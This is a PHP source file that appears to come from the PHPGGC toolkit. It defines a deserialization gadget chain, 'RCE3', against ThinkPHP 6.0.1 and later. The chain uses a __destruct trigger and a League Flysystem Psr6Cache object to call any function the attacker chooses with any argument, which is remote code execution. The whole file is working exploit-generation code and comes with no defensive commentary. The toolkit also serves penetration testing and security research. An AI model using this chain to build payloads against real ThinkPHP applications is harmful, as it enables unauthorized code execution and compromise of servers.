<?php

namespace GadgetChain\ThinkPHP;

class RCE3 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '-6.0.1+';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];
        return new \League\Flysystem\Cached\Storage\Psr6Cache($function, $parameter);
    }
}
